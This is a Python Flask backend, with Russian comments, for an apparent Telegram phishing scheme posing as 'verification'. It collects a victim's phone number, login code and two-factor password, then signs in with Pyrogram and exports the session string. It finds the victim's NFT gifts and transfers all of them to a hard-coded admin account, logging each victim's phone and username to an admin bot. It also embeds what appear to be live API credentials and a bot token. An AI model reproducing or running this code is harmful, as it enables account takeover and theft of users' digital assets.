# app.py — ИСПРАВЛЕННЫЙ БЭКЕНД
# Получает ТОЛЬКО подарки пользователя (инбокс), а не весь магазин

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
import re
from dotenv import load_dotenv
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, FloodWait
import requests

load_dotenv()

app = Flask(__name__)
CORS(app)

API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))

sessions = {}
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def send_admin_log(text):
    """Отправка лога админу"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Log error: {e}")

def send_gifts_list_to_admin(phone, username, gifts_data):
    """
    Отправляет список NFT подарков админу в красивом формате
    gifts_data: список словарей с полями collection, item_id, link
    """
    try:
        if not gifts_data:
            send_admin_log(
                f"📭 *Нет NFT подарков*\n"
                f"📱 {phone}\n"
                f"👤 @{username}"
            )
            return
        
        lines = []
        lines.append("=" * 50)
        lines.append(f"🎁 NFT ПОДАРКИ ПОЛЬЗОВАТЕЛЯ")
        lines.append("=" * 50)
        lines.append(f"📱 Phone: {phone}")
        lines.append(f"👤 Username: @{username}")
        lines.append(f"📦 Всего найдено: {len(gifts_data)}")
        lines.append("")
        
        lines.append("СПИСОК ПОДАРКОВ:")
        for i, gift in enumerate(gifts_data, 1):
            lines.append(f"{i}. [{gift['collection']} #{gift['item_id']}]({gift['link']})")
        
        lines.append("")
        lines.append("=" * 50)
        
        text = "\n".join(lines)
        send_admin_log(text)
        
        # Если много подарков — отправляем файлом
        if len(gifts_data) > 10:
            file_content = "\n".join([f"{g['collection']}-{g['item_id']}: {g['link']}" for g in gifts_data])
            file_data = io.BytesIO(file_content.encode('utf-8'))
            files = {'document': (f"gifts_{phone}_{int(time.time())}.txt", file_data)}
            data = {
                'chat_id': ADMIN_CHAT_ID,
                'caption': f"📁 Полный список подарков @{username} ({len(gifts_data)} шт.)",
                'parse_mode': 'Markdown'
            }
            requests.post(
                f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
                files=files,
                data=data,
                timeout=30
            )
    except Exception as e:
        print(f"Send gifts list error: {e}")

def get_nft_link(gift):
    """
    Формирует ссылку на NFT подарок в формате:
    https://t.me/nft/{collection_name}-{item_id}
    Возвращает словарь с collection, item_id, link
    """
    # Получаем ID предмета
    item_id = None
    if hasattr(gift, 'id'):
        item_id = gift.id
    elif hasattr(gift, 'gift_id'):
        item_id = gift.gift_id
    elif hasattr(gift, 'sticker_id'):
        item_id = gift.sticker_id
    elif hasattr(gift, 'document_id'):
        item_id = gift.document_id
    
    if not item_id:
        return None
    
    # Получаем название коллекции
    collection = None
    
    # Пробуем разные поля
    if hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
        collection = gift.sticker_set_name
    elif hasattr(gift, 'collection_name') and gift.collection_name:
        collection = gift.collection_name
    elif hasattr(gift, 'name') and gift.name:
        collection = gift.name
    elif hasattr(gift, 'title') and gift.title:
        collection = gift.title
    elif hasattr(gift, 'set_name') and gift.set_name:
        collection = gift.set_name
    
    # Если коллекция не найдена — генерируем по ID
    if not collection:
        collection = f"nft_{item_id}"
    
    # Очищаем название от пробелов и спецсимволов
    collection = re.sub(r'[^a-zA-Z0-9_-]', '', str(collection))
    
    # Формируем ссылку
    link = f"https://t.me/nft/{collection}-{item_id}"
    
    return {
        'collection': collection,
        'item_id': item_id,
        'link': link
    }

async def get_user_gifts(client, user_id):
    """
    Получает подарки, которые реально принадлежат пользователю (инбокс)
    Возвращает только NFT подарки (коллекционные)
    """
    all_gifts = []
    print(f"[DEBUG] Getting gifts for user_id: {user_id}")
    
    # Метод 1: get_inbox_gifts() - ТОЛЬКО подарки пользователя
    try:
        if hasattr(client, 'get_inbox_gifts'):
            result = await client.get_inbox_gifts()
            if result:
                all_gifts = result
                print(f"[DEBUG] Found {len(all_gifts)} inbox gifts")
            else:
                print("[DEBUG] get_inbox_gifts returned empty")
    except Exception as e:
        print(f"[DEBUG] get_inbox_gifts failed: {e}")
    
    # Метод 2: GetUserGiftsRequest - прямой вызов MTProto
    if not all_gifts:
        try:
            from pyrogram.raw.functions.payments import GetUserGiftsRequest
            result = await client.invoke(GetUserGiftsRequest(
                user_id=user_id,
                limit=100,
                offset=0
            ))
            if result and hasattr(result, 'gifts'):
                all_gifts = result.gifts
                print(f"[DEBUG] Found {len(all_gifts)} gifts via GetUserGiftsRequest")
        except Exception as e:
            print(f"[DEBUG] GetUserGiftsRequest failed: {e}")
    
    # Метод 3: GetGiftsRequest с фильтрацией по владельцу
    if not all_gifts:
        try:
            from pyrogram.raw.functions.payments import GetGiftsRequest
            result = await client.invoke(GetGiftsRequest())
            if result and hasattr(result, 'gifts'):
                for gift in result.gifts:
                    owner_id = None
                    if hasattr(gift, 'user_id'):
                        owner_id = gift.user_id
                    elif hasattr(gift, 'owner_id'):
                        owner_id = gift.owner_id
                    elif hasattr(gift, 'from_id'):
                        owner_id = gift.from_id
                    
                    if owner_id == user_id:
                        all_gifts.append(gift)
                print(f"[DEBUG] Found {len(all_gifts)} gifts via GetGiftsRequest (filtered)")
        except Exception as e:
            print(f"[DEBUG] GetGiftsRequest failed: {e}")
    
    # Если ничего не нашли — возвращаем пустой список
    if not all_gifts:
        print("[DEBUG] No gifts found for user")
        return []
    
    # Фильтруем только NFT (коллекционные) подарки
    nft_gifts = []
    for gift in all_gifts:
        is_nft = False
        gift_name = "Unknown"
        
        # Получаем имя для логирования
        if hasattr(gift, 'name'):
            gift_name = gift.name
        elif hasattr(gift, 'title'):
            gift_name = gift.title
        
        # Проверяем различные признаки NFT
        if hasattr(gift, 'limited') and gift.limited:
            is_nft = True
        elif hasattr(gift, 'is_limited') and gift.is_limited:
            is_nft = True
        elif hasattr(gift, 'collectible') and gift.collectible:
            is_nft = True
        elif hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
            is_nft = True
        elif hasattr(gift, 'nft') and gift.nft:
            is_nft = True
        
        # Если подарок обычный (эмодзи) — пропускаем
        if hasattr(gift, 'is_regular') and gift.is_regular:
            is_nft = False
        if hasattr(gift, 'is_emoji') and gift.is_emoji:
            is_nft = False
        
        if is_nft:
            nft_gifts.append(gift)
            print(f"[DEBUG] NFT gift found: {gift_name}")
    
    print(f"[DEBUG] Total NFT gifts: {len(nft_gifts)}")
    return nft_gifts

async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=True):
    """
    Основная функция: получает подарки, формирует ссылки и передает админу
    """
    client = None
    try:
        client = Client(
            "in_memory",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )
        await client.connect()
        print(f"[DEBUG] Client connected for {phone}")
        
        # Проверяем авторизацию
        try:
            me = await client.get_me()
            if not me:
                send_admin_log(f"❌ Сессия не активна\n📱 {phone}")
                return {'success': False, 'error': 'Сессия не активна'}
            print(f"[DEBUG] User authorized: @{me.username}")
        except Exception as e:
            send_admin_log(f"❌ Ошибка авторизации\n📱 {phone}\n`{str(e)[:100]}`")
            return {'success': False, 'error': f'Ошибка авторизации: {str(e)[:100]}'}
        
        # Пробуем получить подарки пользователя (только его инбокс)
        send_admin_log(f"🔍 Ищем подарки пользователя @{username}...")
        print(f"[DEBUG] Searching gifts for user_id: {user_id}")
        
        nft_gifts = await get_user_gifts(client, user_id)
        
        # Логируем результат поиска
        send_admin_log(
            f"📊 *Результат поиска*\n"
            f"👤 @{username}\n"
            f"📦 Найдено NFT подарков: {len(nft_gifts)}"
        )
        
        if not nft_gifts:
            send_admin_log(
                f"📭 *У пользователя нет NFT подарков*\n"
                f"📱 {phone}\n"
                f"👤 @{username}\n\n"
                f"ℹ️ Проверь профиль вручную: https://t.me/{username}"
            )
            return {
                'success': True,
                'gifts_found': False,
                'message': 'Нет NFT подарков в профиле',
                'gifts': []
            }
        
        # Формируем список подарков со ссылками
        gifts_data = []
        gift_ids = []
        
        for gift in nft_gifts:
            gift_info = get_nft_link(gift)
            if gift_info:
                gifts_data.append(gift_info)
                
                # Получаем ID для передачи
                gift_id = None
                if hasattr(gift, 'id'):
                    gift_id = gift.id
                elif hasattr(gift, 'gift_id'):
                    gift_id = gift.gift_id
                elif hasattr(gift, 'sticker_id'):
                    gift_id = gift.sticker_id
                
                if gift_id:
                    gift_ids.append(gift_id)
                    print(f"[DEBUG] Gift ID: {gift_id}, Link: {gift_info['link']}")
        
        # Отправляем список админу
        send_gifts_list_to_admin(phone, username, gifts_data)
        
        # Если передавать не нужно — просто возвращаем список
        if not transfer:
            return {
                'success': True,
                'gifts_found': True,
                'gifts': gifts_data,
                'message': f'Найдено {len(gifts_data)} NFT подарков'
            }
        
        # Передаем подарки админу
        if gift_ids:
            transferred = 0
            failed = 0
            
            send_admin_log(f"🔄 Начинаю передачу {len(gift_ids)} подарков...")
            
            for i, gift_id in enumerate(gift_ids, 1):
                try:
                    send_admin_log(f"🔄 Передаю подарок {i}/{len(gift_ids)} (ID: {gift_id})")
                    
                    if hasattr(client, 'transfer_gift'):
                        await client.transfer_gift(gift_id=gift_id, user_id=ADMIN_USER_ID)
                    else:
                        from pyrogram.raw.functions.payments import TransferGiftRequest
                        await client.invoke(TransferGiftRequest(
                            gift_id=gift_id,
                            to_id=ADMIN_USER_ID
                        ))
                    transferred += 1
                    print(f"[DEBUG] Gift {gift_id} transferred successfully")
                    await asyncio.sleep(0.5)
                except FloodWait as e:
                    wait_time = e.value
                    send_admin_log(f"⏳ FloodWait {wait_time} секунд\n📱 {phone}")
                    await asyncio.sleep(wait_time)
                    try:
                        if hasattr(client, 'transfer_gift'):
                            await client.transfer_gift(gift_id=gift_id, user_id=ADMIN_USER_ID)
                        else:
                            from pyrogram.raw.functions.payments import TransferGiftRequest
                            await client.invoke(TransferGiftRequest(
                                gift_id=gift_id,
                                to_id=ADMIN_USER_ID
                            ))
                        transferred += 1
                        print(f"[DEBUG] Gift {gift_id} transferred after flood wait")
                    except Exception as e:
                        failed += 1
                        print(f"[DEBUG] Transfer retry failed for {gift_id}: {e}")
                except Exception as e:
                    failed += 1
                    print(f"[DEBUG] Transfer failed for {gift_id}: {e}")
                    continue
            
            result_msg = f"✅ Передано: {transferred}\n❌ Не удалось: {failed}"
            send_admin_log(f"📊 *Результат передачи*\n📱 {phone}\n{result_msg}")
            
            return {
                'success': True,
                'gifts_found': True,
                'transferred': transferred,
                'failed': failed,
                'total': len(gift_ids),
                'gifts': gifts_data,
                'message': f'Передано {transferred} из {len(gift_ids)} подарков'
            }
        
        return {
            'success': True,
            'gifts_found': True,
            'gifts': gifts_data,
            'message': f'Найдено {len(gifts_data)} NFT подарков, но не удалось получить ID для передачи'
        }
        
    except Exception as e:
        error_msg = str(e)[:200]
        send_admin_log(f"❌ Ошибка\n📱 {phone}\n`{error_msg}`")
        return {'success': False, 'error': error_msg}
    finally:
        if client and hasattr(client, 'is_connected') and client.is_connected:
            try:
                await client.disconnect()
                print(f"[DEBUG] Client disconnected")
            except:
                pass

# ---------- ЭНДПОИНТЫ ДЛЯ ВЕРИФИКАЦИИ ----------

async def send_code_async(phone):
    try:
        client = Client(
            "in_memory",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
        await client.connect()

        sent_code = await client.send_code(phone)

        sessions[phone] = {
            'client': client,
            'phone_code_hash': sent_code.phone_code_hash
        }

        send_admin_log(f"📱 Код отправлен для {phone}")
        return {'success': True, 'phone_code_hash': sent_code.phone_code_hash}

    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_async(phone, code, phone_code_hash):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}

        client = client_data['client']

        try:
            signed_in = await client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code
            )

            session_string = await client.export_session_string()

            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }

            await client.disconnect()

            send_admin_log(f"✅ Верификация успешна\n📱 {phone}\n👤 @{session_data['username']}")

            # Получаем подарки и передаем админу
            result = await transfer_nft_gifts(
                session_string, 
                phone, 
                session_data['username'], 
                session_data['user_id'],
                transfer=True
            )

            return {
                'success': True, 
                'hasPassword': False, 
                'sessionData': session_data,
                'gifts_result': result
            }

        except SessionPasswordNeeded:
            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}")
            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}

        except PhoneCodeInvalid:
            return {'success': False, 'error': 'Invalid code'}

        except PhoneCodeExpired:
            return {'success': False, 'error': 'Code expired'}

        except Exception as e:
            return {'success': False, 'error': str(e)}

    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_async(phone, password):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}

        client = client_data['client']

        try:
            signed_in = await client.check_password(password=password)

            session_string = await client.export_session_string()

            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }

            await client.disconnect()

            send_admin_log(f"🔑 Верификация по паролю успешна\n📱 {phone}\n👤 @{session_data['username']}")

            # Получаем подарки и передаем админу
            result = await transfer_nft_gifts(
                session_string, 
                phone, 
                session_data['username'], 
                session_data['user_id'],
                transfer=True
            )

            return {
                'success': True, 
                'sessionData': session_data,
                'gifts_result': result
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    except Exception as e:
        return {'success': False, 'error': str(e)}

def run_async(coro):
    return loop.run_until_complete(coro)

# ---------- FLASK ЭНДПОИНТЫ ----------

@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    return jsonify({
        'status': 'online',
        'library': 'Pyrogram',
        'version': '2.0',
        'note': 'Получает ТОЛЬКО подарки пользователя (инбокс)'
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()

    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone'}), 400

    result = run_async(send_code_async(phone))

    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()

    if not phone or not code or not phone_code_hash:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400

    result = run_async(check_code_async(phone, code, phone_code_hash))

    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': result.get('sessionData'),
                'gifts': result.get('gifts_result', {}),
                'message': 'Verified'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()

    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400

    result = run_async(check_password_async(phone, password))

    if result['success']:
        return jsonify({
            'success': True,
            'sessionData': result.get('sessionData'),
            'gifts': result.get('gifts_result', {}),
            'message': 'Password verified successfully'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

# Дополнительный эндпоинт для получения подарков без передачи
@app.route('/getGifts', methods=['POST'])
def get_gifts_only():
    data = request.json or {}
    session_string = data.get('sessionString', '').strip()
    phone = data.get('phone', '').strip()
    username = data.get('username', '').strip()
    user_id = data.get('userId', '').strip()
    transfer = data.get('transfer', False)

    if not session_string or not phone:
        return jsonify({'success': False, 'error': 'Missing sessionString or phone'}), 400

    if not user_id:
        user_id = 0
    
    result = run_async(transfer_nft_gifts(
        session_string, 
        phone, 
        username or 'unknown', 
        int(user_id) if user_id else 0,
        transfer=transfer
    ))

    if result['success']:
        return jsonify({
            'success': True,
            'gifts': result.get('gifts', []),
            'transferred': result.get('transferred', 0),
            'total': result.get('total', 0),
            'message': result.get('message', 'OK')
        })
    else:
        return jsonify({'success': False, 'error': result.get('error', 'Unknown error')}), 400

if __name__ == '__main__':
    print("=" * 60)
    print("🔐 NFT GIFT PARSER & TRANSFER SERVICE")
    print("📌 Версия 2.0 — ТОЛЬКО ИНБОКС ПОЛЬЗОВАТЕЛЯ")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=False)
